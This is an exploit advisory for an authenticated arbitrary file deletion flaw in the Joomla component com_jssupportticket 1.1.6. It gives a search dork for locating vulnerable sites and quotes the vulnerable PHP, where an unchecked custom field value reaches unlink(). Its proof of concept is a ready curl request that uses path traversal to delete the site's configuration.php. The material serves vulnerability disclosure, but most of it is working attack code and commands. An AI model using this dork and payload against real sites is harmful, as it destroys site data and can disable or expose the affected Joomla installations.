@@ -1,0 +1,64 @@
+#Exploit Title: Joomla! component com_jssupportticket - Authenticated Arbitrary File Deletion
+#Dork: inurl:"index.php?option=com_jssupportticket"
+#Date: 10.08.19
+#Exploit Author: qw3rTyTy
+#Vendor Homepage: https://www.joomsky.com/
+#Software Link: https://www.joomsky.com/46/download/1.html
+#Version: 1.1.6
+#Tested on: Debian/nginx/joomla 3.9.0
+#####################################
+#Vulnerability details:
+#####################################
+This vulnerability is caused when processing custom user field.
+
+file:	admin/models/ticket.php
+function:	storeTicket
+
+    54	    function storeTicket($data){
+    ...snip...
+    75	        $userfield = $this->getJSModel('userfields')->getUserfieldsfor(1);
+    76	        $params = array();
+    77		foreach ($userfield AS $ufobj) {
+    78				$vardata = '';
+    ...snip...
+   121			if(isset($data[$ufobj->field.'_1']) && $data[$ufobj->field.'_1'] == 1){
+   122	                $customflagfordelete = true;
+   123			$custom_field_namesfordelete[]= $data[$ufobj->field.'_2'];	//no check.
+   	...snip...
+   198	        if($customflagfordelete == true){
+   199			foreach ($custom_field_namesfordelete as $key) {
+   200	                $res = $this->removeFileCustom($ticketid,$key);	//!!!
+   201	            }
+   202	        }
+   ...snip...
+  1508	    function removeFileCustom($id, $key){
+  1509	        $filename = str_replace(' ', '_', $key);
+  1510	
+  1511	        if(! is_numeric($id))
+  1512	            return;
+  1513	
+  1514	        $db = JFactory::getDbo();
+  1515	        $config = $this->getJSModel('config')->getConfigByFor('default');
+  1516	        $datadirectory = $config['data_directory'];
+  1517	
+  1518	        $base = JPATH_BASE;
+  1519	        if(JFactory::getApplication()->isAdmin()){
+  1520	            $base = substr($base, 0, strlen($base) - 14); //remove administrator    
+  1521	        }
+  1522	
+  1523	        $path = $base . '/' . $datadirectory. '/attachmentdata/ticket';
+  1524	
+  1525	        $query = "SELECT attachmentdir FROM `#__js_ticket_tickets` WHERE id = ".$id;
+  1526	        $db->setQuery($query);
+  1527	        $foldername = $db->loadResult();
+  1528	        $userpath = $path . '/' . $foldername.'/'.$filename;
+  1529	        unlink($userpath);	//!!!
+  1530	        return;
+  1531	    }
+
+#####################################
+#PoC:
+#####################################
+When administrator has added custom user field as "19", attacker are can trigger this vulnerability by send a following request.
+
+$> curl -X POST -i -F 'option=com_jssupportticket' -F 'c=ticket' -F 'task=saveTicket' -F '{VALID_FORMTOKEN_FROM_FORMTICKET}=1' -F 'Itemid=666' -F 'id=' -F 'message=woot' -F '19_1=1' -F '19_2=../../../../configuration.php' -F 'filename[]=@./woot.txt' -H 'Cookie: VALID_SESSION_ID=VALID_SESSION_ID' 'http://localhost/index.php'
